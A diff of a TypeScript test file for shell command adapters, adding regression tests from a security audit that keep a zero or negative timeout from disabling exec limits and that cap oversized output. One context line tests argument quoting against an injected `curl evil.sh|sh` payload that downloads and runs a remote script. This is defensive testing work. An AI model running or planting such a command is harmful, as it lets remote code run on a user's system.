@@ -151,7 +151,15 @@ describe('NativeShellAdapter', () => {
    */
   it('NA10: clampExecTimeout topea a MAX_EXEC_TIMEOUT_MS sin importar lo pedido', () => {
     expect(clampExecTimeout(999_999_999)).toBe(MAX_EXEC_TIMEOUT_MS);
-    expect(clampExecTimeout(-50)).toBe(0);
+    // Regresion (ronda 60 del audit, HIGH): el piso era 0, no 1 — pero
+    // tanto Node's child_process.exec (`timeout: 0`) como el guard previo
+    // `if (opts?.timeout)` de JustBashShellAdapter.exec interpretan 0 como
+    // "SIN limite", no como "timeout instantaneo". Un --timeout 0 (o
+    // cualquier negativo, que Math.max ya normalizaba a 0) desactivaba
+    // por completo la proteccion. El piso ahora es 1: cualquier input
+    // (negativo, cero, o ausente) siempre resulta en un timeout real > 0.
+    expect(clampExecTimeout(-50)).toBe(1);
+    expect(clampExecTimeout(0)).toBe(1);
     expect(clampExecTimeout(1000)).toBe(1000);
     expect(clampExecTimeout(undefined)).toBe(30000);
   });
@@ -281,6 +289,60 @@ describe('JustBashShellAdapter', () => {
 
     const [cmd] = mock.exec.mock.calls[0];
     expect(cmd).toBe(`ls -la '/tmp && curl evil.sh|sh'`);
+  });
+
+  /**
+   * Regresion (ronda 60 del audit, HIGH): `if (opts?.timeout)` trataba
+   * timeout:0 (falsy en JS) como "no aplicar ningun timeout", saltandose
+   * el AbortController por completo — un caller pidiendo --timeout 0
+   * corria sin limite alguno. Ahora el timeout SIEMPRE se aplica
+   * (clampExecTimeout garantiza un valor > 0, incluso para 0/negativo).
+   */
+  it('JB10: exec aplica un timeout real incluso cuando opts.timeout es 0', async () => {
+    vi.useFakeTimers();
+    try {
+      const mock = createMockBash();
+      let capturedSignal: AbortSignal | undefined;
+      mock.exec.mockImplementationOnce((_cmd: string, opts: any) => {
+        capturedSignal = opts?.signal;
+        return new Promise((_resolve, reject) => {
+          opts?.signal?.addEventListener('abort', () => {
+            const err: any = new Error('aborted');
+            err.name = 'AbortError';
+            reject(err);
+          });
+        });
+      });
+      const adapter = new JustBashShellAdapter(mock);
+
+      const resultPromise = adapter.exec('sleep-forever', { timeout: 0 });
+      await vi.advanceTimersByTimeAsync(5);
+      const result = await resultPromise;
+
+      expect(capturedSignal).toBeDefined();
+      expect(result.exitCode).toBe(124);
+      expect(result.stderr).toContain('Timeout after 1ms');
+    } finally {
+      vi.useRealTimers();
+    }
+  });
+
+  /**
+   * Regresion (ronda 60 del audit, HIGH): NativeShellAdapter.exec() ya
+   * capea output via `maxBuffer` de child_process — JustBashShellAdapter
+   * no tenia proteccion analoga: bash.exec() devuelve el string COMPLETO
+   * de una, y nada lo topeaba antes de propagarlo/retenerlo en memoria.
+   */
+  it('JB11: exec trunca stdout/stderr que exceden el cap de output', async () => {
+    const mock = createMockBash();
+    const huge = 'x'.repeat(2 * 1024 * 1024);
+    mock.exec.mockResolvedValueOnce({ stdout: huge, stderr: '', exitCode: 0 });
+    const adapter = new JustBashShellAdapter(mock);
+
+    const result = await adapter.exec('cat bigfile');
+
+    expect(Buffer.byteLength(result.stdout, 'utf-8')).toBeLessThan(Buffer.byteLength(huge, 'utf-8'));
+    expect(result.stdout).toContain('[...output truncated');
   });
 });
 
